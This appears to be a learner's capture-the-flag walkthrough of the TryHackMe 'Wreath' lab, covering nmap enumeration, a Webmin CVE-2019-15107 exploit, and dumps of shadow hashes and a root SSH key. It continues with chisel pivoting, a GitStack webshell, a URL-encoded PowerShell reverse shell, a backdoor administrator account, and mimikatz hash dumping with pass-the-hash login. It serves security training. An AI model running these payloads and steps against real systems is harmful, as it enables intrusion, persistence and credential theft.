@@ -1,0 +1,1301 @@
+Room: Wreath
+Link: https://tryhackme.com/room/wreath
+Level: Easy
+
+----------Enumeration -----------------
+nmap -sC -sV -T4 10.200.73.200  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-29 16:05 GMT
+Nmap scan report for 10.200.73.200
+Host is up (0.21s latency).
+Not shown: 970 filtered tcp ports (no-response), 25 filtered tcp ports (admin-prohibited)
+PORT      STATE  SERVICE    VERSION
+22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
+|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
+|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
+80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
+|_http-title: Did not follow redirect to https://thomaswreath.thm
+|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
+443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
+|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
+|_ssl-date: TLS randomness does not represent time
+|_http-title: Thomas Wreath | Developer
+| tls-alpn: 
+|_  http/1.1
+| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
+| Not valid before: 2025-03-29T15:56:17
+|_Not valid after:  2026-03-29T15:56:17
+| http-methods: 
+|_  Potentially risky methods: TRACE
+9090/tcp  closed zeus-admin
+10000/tcp open   http       MiniServ 1.890 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 68.30 seconds
+
+With this we have 4 open ports
+22 ---> SSH
+80 --> HTTP
+443 --> HTTPS
+10000 -->  MiniServ 1.890 (Webmin httpd)
+
+####Answer to questions-------------Enumeration
+-->4
+-->Centos
+-->https://thomaswreath.thm
+-->+447821548812
+-->MiniServ 1.890 (Webmin httpd)
+-->CVE-2019-15107
+
+
+-----------------------Exploitation--------------------
+
+git clone https://github.com/MuirlandOracle/CVE-2019-15107
+cd CVE-2019-15107
+pip install -r requirements.txt --break-system-packages
+python CVE-2019-15107.py 10.200.73.200                 
+
+	__        __   _               _         ____   ____ _____ 
+	\ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|
+	 \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|
+	  \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___
+	   \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|
+
+						@MuirlandOracle
+
+		
+[*] Server is running in SSL mode. Switching to HTTPS
+[+] Connected to https://10.200.73.200:10000/ successfully.
+[+] Server version (1.890) should be vulnerable!
+[+] Benign Payload executed!
+
+[+] The target is vulnerable and a pseudoshell has been obtained.
+Type commands to have them executed on the target.
+[*] Type 'exit' to exit.
+[*] Type 'shell' to obtain a full reverse shell (UNIX only).
+
+# whoami
+root
+# cat /etc/shadow
+root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::
+bin:*:18358:0:99999:7:::
+daemon:*:18358:0:99999:7:::
+adm:*:18358:0:99999:7:::
+lp:*:18358:0:99999:7:::
+sync:*:18358:0:99999:7:::
+shutdown:*:18358:0:99999:7:::
+halt:*:18358:0:99999:7:::
+mail:*:18358:0:99999:7:::
+operator:*:18358:0:99999:7:::
+games:*:18358:0:99999:7:::
+ftp:*:18358:0:99999:7:::
+nobody:*:18358:0:99999:7:::
+dbus:!!:18573::::::
+systemd-coredump:!!:18573::::::
+systemd-resolve:!!:18573::::::
+tss:!!:18573::::::
+polkitd:!!:18573::::::
+libstoragemgmt:!!:18573::::::
+cockpit-ws:!!:18573::::::
+cockpit-wsinstance:!!:18573::::::
+sssd:!!:18573::::::
+sshd:!!:18573::::::
+chrony:!!:18573::::::
+rngd:!!:18573::::::
+twreath:$6$0my5n311RD7EiK3J$zVFV3WAPCm/dBxzz0a7uDwbQenLohKiunjlDonkqx1huhjmFYZe0RmCPsHmW3OnWYwf8RWPdXAdbtYpkJCReg.::0:99999:7:::
+unbound:!!:18573::::::
+apache:!!:18573::::::
+nginx:!!:18573::::::
+mysql:!!:18573::::::
+
+
+# cat /root/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+#
+
+####ANswer to question-----------exploitation
+--> root
+-->$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::
+--> /root/.ssh/id_rsa
+
+
+After that i create my personnal id_rsa file ad add right chmod 600
+
+┌──(thierry㉿thierry)-[~/Desktop/rooms/Tryhackme/wreath]
+└─$ nano id_rsa
+                                                                                                                                                                             
+┌──(thierry㉿thierry)-[~/Desktop/rooms/Tryhackme/wreath]
+└─$ chmod 600 id_rsa 
+                                                                                                                                                                             
+┌──(thierry㉿thierry)-[~/Desktop/rooms/Tryhackme/wreath]
+└─$ ssh root@10.200.73.200 -i id_rsa
+[root@prod-serv ~]# 
+
+
+
+---------------------Git server Enumeration---------------------
+copy the nmap binary for linux into our server and try scanning 
+
+[root@prod-serv ~]# curl http://10.50.66.152/nmap -o /tmp/petstar-nmap
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 5805k  100 5805k    0     0   649k      0  0:00:08  0:00:08 --:--:--  668k
+[root@prod-serv ~]# cd /tmp
+[root@prod-serv tmp]# ls
+chisel-sid.neuro  petstar-nmap     systemd-private-bdd3b5d3b1214aed83d828c1440e85c7-httpd.service-wK0e0U
+nmap-chocks       scan2-chocks     systemd-private-bdd3b5d3b1214aed83d828c1440e85c7-mariadb.service-fdkyw8
+nmap-cijid        scan-chocks      systemd-private-bdd3b5d3b1214aed83d828c1440e85c7-php-fpm.service-yqorV3
+nmap-sid.neuro    socat-sid.neuro
+[root@prod-serv tmp]# chmod +x petstar-nmap 
+[root@prod-serv tmp]# ./petstar-nmap -sn 10.200.73.0/24
+
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-03-29 16:30 GMT
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for ip-10-200-73-1.eu-west-1.compute.internal (10.200.73.1)
+Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
+Host is up (-0.17s latency).
+MAC Address: 02:A2:28:EA:C8:01 (Unknown)
+Nmap scan report for ip-10-200-73-100.eu-west-1.compute.internal (10.200.73.100)
+Host is up (0.0011s latency).
+MAC Address: 02:52:F2:F6:5F:BF (Unknown)
+Nmap scan report for ip-10-200-73-150.eu-west-1.compute.internal (10.200.73.150)
+Host is up (0.0025s latency).
+MAC Address: 02:04:D5:1D:10:8D (Unknown)
+Nmap scan report for ip-10-200-73-250.eu-west-1.compute.internal (10.200.73.250)
+Host is up (0.000071s latency).
+MAC Address: 02:EA:35:42:4E:21 (Unknown)
+Nmap scan report for ip-10-200-73-200.eu-west-1.compute.internal (10.200.73.200)
+Host is up.
+Nmap done: 256 IP addresses (5 hosts up) scanned in 4.82 seconds
+[root@prod-serv tmp]# 
+
+
+
+After that we wil try futher enumeration
+[root@prod-serv tmp]# ./petstar-nmap 10.200.73.100-150
+
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-03-29 16:35 GMT
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for ip-10-200-73-100.eu-west-1.compute.internal (10.200.73.100)
+Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
+Host is up (0.00023s latency).
+All 6150 scanned ports on ip-10-200-73-100.eu-west-1.compute.internal (10.200.73.100) are filtered
+MAC Address: 02:52:F2:F6:5F:BF (Unknown)
+
+Nmap scan report for ip-10-200-73-150.eu-west-1.compute.internal (10.200.73.150)
+Host is up (0.00086s latency).
+Not shown: 6143 filtered ports
+PORT     STATE SERVICE
+80/tcp   open  http
+135/tcp  open  epmap
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+5357/tcp open  wsdapi
+5985/tcp open  wsman
+MAC Address: 02:04:D5:1D:10:8D (Unknown)
+
+Nmap done: 51 IP addresses (2 hosts up) scanned in 104.17 seconds
+[root@prod-serv tmp]#
+
+#####Answer to questions----Git server Enumeration--
+As we are connected on ssh and we don't have a web browser we will do port fowarding with cisel
+After downloading chisel on the /tmp of the comprolised machine and have chisel on out attacker machine we will start our opperation
+Note:
+	Our attacking machine: 10.50.66.152
+	Compromised machine: 10.200.73.200
+	Targeted machine: 10.200.73.150
+	
+On our attacking machine we will launch a chisel server: chisel server -p 8888 -reverse
+
+chisel server -p 8888 -reverse
+2025/03/29 22:15:08 server: Reverse tunnelling enabled
+2025/03/29 22:15:08 server: Fingerprint SH/EQdSSoyX1drJUgDQ4krBLW27JGeeTnp9uoqClJ7o=
+2025/03/29 22:15:08 server: Listening on http://0.0.0.0:8888
+2025/03/29 22:22:55 server: session#3: Client version (1.7.3) differs from server version (1.10.1-0kali1)
+2025/03/29 22:22:55 server: session#3: tun: proxy#R:8001=>10.200.73.150:80: Listening
+
+
+On the compromise machine we will use client to do the redirection: ./chisel-petstar client 10.50.66.152:8888 R:8001:10.200.73.150:80
+
+[root@prod-serv tmp]# ./chisel-petstar client 10.50.66.152:8888 R:8001:10.200.73.150:80
+2025/03/29 22:22:53 client: Connecting to ws://10.50.66.152:8888
+2025/03/29 22:22:55 client: Connected (Latency 207.154259ms)
+
+
+The client command firstly connect to our chisel server. After that we specifies the port that will be open on our machine, the target machine Ip and his port that we want to foward. After doing that we just have to access in our attacking machine at : http://localhost:8001/
+
+When we access to the page we have an error message:
+
+Page not found (404)
+Request Method: 	GET
+Request URL: 	http://localhost:8001/
+Using the URLconf defined in app.urls, Django tried these URL patterns, in this order:
+
+    ^registration/login/$
+    ^gitstack/
+    ^rest/
+The current URL, , didn't match any of these.
+You're seeing this error because you have DEBUG = True in your Django settings file. Change that to False, and Django will display a standard 404 page.
+
+
+Do we will try http://localhost:8001/gitstack/ and were redirected to : http://localhost:8001/registration/login/?next=/gitstack/
+
+We try default credentials but nothing.
+
+So we will use searchsploit to search an exploit
+
+searchsploit gitstack           
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                             |  Path
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+GitStack - Remote Code Execution                                                                                                           | php/webapps/44044.md
+GitStack - Unsanitized Argument Remote Code Execution (Metasploit)                                                                         | windows/remote/44356.rb
+GitStack 2.3.10 - Remote Code Execution                                                                                                    | php/webapps/43777.py
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+searchsploit -m php/webapps/43777.py
+  Exploit: GitStack 2.3.10 - Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/43777
+     Path: /usr/share/exploitdb/exploits/php/webapps/43777.py
+    Codes: N/A
+ Verified: False
+File Type: Python script, ASCII text executable
+Copied to: /home/thierry/Desktop/rooms/Tryhackme/wreath/43777.py
+
+###Answers to git server pivotiong-------
+--> gitstack
+--> nay
+--> 43777
+
+
+------------------Code  review-------------------------------
+I use dos2unix tool to convert the script into linux file.
+
+dos2unix ./43777.py
+
+After doing that i replace the ip adress in the code :ip = '127.0.0.1:8001'
+Now we are ready for launching the exloit
+
+####Answer to questions
+-->18.01.2018
+-->Python2
+-->csrftoken
+
+
+--------------------Git server exploitation----------------------------------
+
+ ./43777.py
+[+] Get user list
+[+] Found user twreath
+[+] Web repository already enabled
+[+] Get repositories list
+[+] Found repository Website
+[+] Add user to repository
+[+] Disable access for anyone
+[+] Create backdoor in PHP
+Your GitStack credentials were not entered correcly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. <br />Note : You have to enter the credentials of a user which has at least read access to your repository. Your GitStack administration panel username/password will not work. 
+[+] Execute command
+"nt authority\system
+
+
+We can also use curl to exploit it 
+
+curl -X POST http://127.0.0.1:8001/web/exploit.php -d "a=whoami" 
+"nt authority\system
+" 
+
+$ curl -X POST http://127.0.0.1:8001/web/exploit.php -d "a=hostname"
+"git-serv
+" 
+                                                                                                                                                                             
+┌──(thierry㉿thierry)-[~/Desktop/rooms/Tryhackme/wreath]
+└─$ curl -X POST http://127.0.0.1:8001/web/exploit.php -d "a=systeminfo"
+"
+Host Name:                 GIT-SERV
+OS Name:                   Microsoft Windows Server 2019 Standard
+OS Version:                10.0.17763 N/A Build 17763
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+
+
+After that we will recieve the reverse shell on .200 box so we upload netcat there. but before launch the netcat we know we are on centOs so we will go to change firewall policies to allow our port with command :
+
+firewall-cmd --zone=public --add-port 16002/tcp
+
+We use this comman: 
+
+curl -X POST http://127.0.0.1:8001/web/exploit.php -d "a=powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.73.200%27%2C16002%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22"
+
+[root@prod-serv tmp]# chmod +x netcat-petstar 
+[root@prod-serv tmp]# ./netcat-petstar -lvnp 16002
+Ncat: Version 6.49BETA1 ( http://nmap.org/ncat )
+Ncat: Listening on :::16002
+Ncat: Listening on 0.0.0.0:16002
+Ncat: Connection from 10.200.73.150.
+Ncat: Connection from 10.200.73.150:50185.
+dir
+
+
+    Directory: C:\GitStack\gitphp
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       08/11/2020     13:28                cache                                                                 
+d-----       08/11/2020     13:29                config                                                                
+d-----       08/11/2020     13:28                css                                                                   
+d-----       08/11/2020     13:28                doc                                                                   
+d-----       08/11/2020     13:28                images                                                                
+d-----       08/11/2020     13:28                include                                                               
+d-----       08/11/2020     13:28                js                                                                    
+d-----       08/11/2020     13:28                lib                                                                   
+d-----       08/11/2020     13:28                locale                                                                
+d-----       08/11/2020     13:28                templates                                                             
+d-----       30/03/2025     13:26                templates_c                                                           
+-a----       26/03/2025     19:23             34 Ayah-exploit.php                                                      
+-a----       28/03/2025     10:14             34 exploit-chocks.php                                                    
+-a----       31/03/2025     08:29             34 exploit.php                                                           
+-a----       16/05/2012     14:20           5742 index.php                                                             
+-a----       26/03/2025     09:43             34 sid.neuro-exploit.php                                                 
+-a----       30/03/2025     14:02          45272 vrx-nc.exe                                                            
+
+
+PS C:\GitStack\gitphp> 
+
+
+YYYYYEEEEESSS we did it
+#######Answer to questions --Git server exploitation----------
+-->git-serv
+-->Windows
+-->NT AUTHORITY\SYSTEM
+-->0
+
+
+-----------------------------Git server Stabilisation and post exploitation----------------------------------------
+To have persistence access on the machine, we will create a user and give him privileges
+
+PS C:\GitStack\gitphp> net user petstar petstar /add
+The command completed successfully.
+
+PS C:\GitStack\gitphp> net localgroup Administrators petstar /add
+The command completed successfully.
+
+PS C:\GitStack\gitphp> net localgroup "Remote Management Users" petstar /add                 
+The command completed successfully.
+
+PS C:\GitStack\gitphp> net user petstar
+User name                    petstar
+Full Name                    
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            31/03/2025 09:25:38
+Password expires             Never
+Password changeable          31/03/2025 09:25:38
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Remote Management Use
+                             *Users                
+Global Group memberships     *None                 
+The command completed successfully.
+
+PS C:\GitStack\gitphp>
+
+
+
+Now we will conect with out user account but remember that we don't have direct access to the box .150.
+
+At this moment we do not need the port 80 again on the .150 so we will use chisel to send winrm port of .150 to our machine
+
+./chisel-petstar client 10.50.66.152:8888 R:5985:10.200.73.150:5985
+ 
+ Now let us connect to .150 with evil-winrm
+ 
+
+evil-winrm -u petstar -p petstar -i 127.0.0.1    
+*Evil-WinRM* PS C:\Users\petstar\Documents>  
+
+
+As winrm giv us medium integrity shells for added administrator accounts. Even if your new account has Administrator permissions, you won't actually be able to perform administrative actions with it via winrm.
+
+We don't have choice we will focus on RDP and to do that we will do the same thing with chisel to give us access to port 3389
+
+./chisel-petstar client 10.50.66.152:8888 R:3389:10.200.73.150:3389
+
+After that we connect with RDP
+
+xfreerdp3 /v:127.0.0.1 /u:petstar /p:"petstar" +clipboard /dynamic-resolution /f /drive:Bureau,/home/thierry/Desktop
+
+
+When we connect we upload our mimikatz to get admin hashes
+
+C:\Users\petstar\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is C0B9-B671
+
+ Directory of C:\Users\petstar\Desktop
+
+31/03/2025  09:59    <DIR>          .
+31/03/2025  09:59    <DIR>          ..
+31/03/2025  09:55         1,250,056 mimikatz.exe
+               1 File(s)      1,250,056 bytes
+               2 Dir(s)   7,001,985,024 bytes free
+
+C:\Users\petstar\Desktop>mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # token::elevate
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+
+672     {0;000003e7} 1 D 20318          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !
+ * Process Token : {0;0021fc7e} 3 F 2652171     GIT-SERV\petstar        S-1-5-21-3335744492-1614955177-2693036043-1003
+(15g,24p)       Primary
+ * Thread Token  : {0;000003e7} 1 D 2686045     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+mimikatz # lsadump::sam
+Domain : GIT-SERV
+SysKey : 0841f6354f4b96d21b99345d07b66571
+Local SID : S-1-5-21-3335744492-1614955177-2693036043
+
+SAMKey : f4a3c96f8149df966517ec3554632cf4
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 68b1608793104cca229de9f1dfb6fbae
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WIN-1696O63F791Administrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 8f7590c29ffc78998884823b1abbc05e6102a6e86a3ada9040e4f3dcb1a02955
+      aes128_hmac       (4096) : 503dd1f25a0baa75791854a6cfbcd402
+      des_cbc_md5       (4096) : e3915234101c6b75
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WIN-1696O63F791Administrator
+    Credentials
+      des_cbc_md5       : e3915234101c6b75
+
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+  Hash NTLM: c70854ba88fb4a9c56111facebdf3c36
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : e389f51da73551518c3c2096c0720233
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WDAGUtilityAccount
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 1d916df8ca449782c73dbaeaa060e0785364cf17c18c7ff6c739ceb1d7fdf899
+      aes128_hmac       (4096) : 33ee2dbd44efec4add81815442085ffb
+      des_cbc_md5       (4096) : b6f1bac2346d9e2c
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WDAGUtilityAccount
+    Credentials
+      des_cbc_md5       : b6f1bac2346d9e2c
+
+
+RID  : 000003e9 (1001)
+User : Thomas
+  Hash NTLM: 02d90eda8f6b6b06c32d5f207831101f
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 03126107c740a83797806c207553cef7
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : GIT-SERVThomas
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 19e69e20a0be21ca1befdc0556b97733c6ac74292ab3be93515786d679de97fe
+      aes128_hmac       (4096) : 1fa6575936e4baef3b69cd52ba16cc69
+      des_cbc_md5       (4096) : e5add55e76751fbc
+    OldCredentials
+      aes256_hmac       (4096) : 9310bacdfd5d7d5a066adbb4b39bc8ad59134c3b6160d8cd0f6e89bec71d05d2
+      aes128_hmac       (4096) : 959e87d2ba63409b31693e8c6d34eb55
+      des_cbc_md5       (4096) : 7f16a47cef890b3b
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : GIT-SERVThomas
+    Credentials
+      des_cbc_md5       : e5add55e76751fbc
+    OldCredentials
+      des_cbc_md5       : 7f16a47cef890b3b
+
+
+RID  : 000003ea (1002)
+User : sid.neuro
+  Hash NTLM: bcf0f8c5a5b30cd1071aeabf842d0e7d
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : bb1db36f0536daef38ccbf8c3bd43afe
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : GIT-SERVsid.neuro
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 96c9f59cf725a794c463b8f299e536cdf93d3ff503420f316ae0f8d6f825269e
+      aes128_hmac       (4096) : 46841e9cac498ce96c96aa5bc5a9f13a
+      des_cbc_md5       (4096) : 7052856b62bfe02f
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : GIT-SERVsid.neuro
+    Credentials
+      des_cbc_md5       : 7052856b62bfe02f
+
+
+RID  : 000003eb (1003)
+User : petstar
+  Hash NTLM: f47f1a5586e37d3940221787ebd0d27f
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 033f3e8ccae22b5d923e98d7ba11e9d7
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : GIT-SERVpetstar
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 633ceaa58811c9539cd5b77f2782e7dd1acb5bca740dd6926daed3eecd89bf3e
+      aes128_hmac       (4096) : fa46ecbb2e9cfb38372110071bc30ee6
+      des_cbc_md5       (4096) : 0eea68864a3b7a13
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : GIT-SERVpetstar
+    Credentials
+      des_cbc_md5       : 0eea68864a3b7a13
+
+
+mimikatz #
+
+
+
+After getting it we can logged in as admin with evil-winrm After changing our port fowarding to 5985
+
+evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 127.0.0.1
+
+###############Answer to questions  git server stabilization and post exploitation
+-->37db630168e5f82aafa8461e05c6bbd1
+-->02d90eda8f6b6b06c32d5f207831101f
+-->i<3ruby
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------
+#########################Ligolo usage##################""
+I decide to use ligolo-ng for pivoting to avoid all problems because port fowarding is limited
+
